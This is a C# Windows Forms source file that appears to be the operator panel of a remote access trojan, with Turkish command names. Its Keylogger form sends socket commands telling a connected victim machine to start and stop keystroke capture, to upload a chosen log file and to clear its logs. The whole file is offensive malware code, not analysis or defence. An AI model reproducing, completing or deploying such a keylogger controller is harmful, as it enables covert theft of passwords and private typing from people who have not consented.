using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class Keylogger : Form
    {
        Socket sock;
        public string ID = "";
        public Keylogger(Socket s, string uniq)
        {
            InitializeComponent();
            ID = uniq;
            sock = s;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("KEYBASLAT", "[VERI][0x09]", sock);
                button1.Enabled = false; button2.Enabled = true;
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("KEYDUR", "[VERI][0x09]", sock);
                button1.Enabled = true; button2.Enabled = false;
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()) && comboBox1.SelectedItem.ToString() != "No logs.")
            {
                try
                {
                    Form1.KomutGonder("KEYCEK", "[VERI]" + comboBox1.SelectedItem.ToString() + "[VERI][0x09]", sock);
                }
                catch (Exception) { }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                Form1.KomutGonder("LOGTEMIZLE", "[VERI][0x09]", sock);
                comboBox1.Items.Clear();
            }
            catch (Exception) { }
        }

        private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            button2.PerformClick();
        }
    }
}
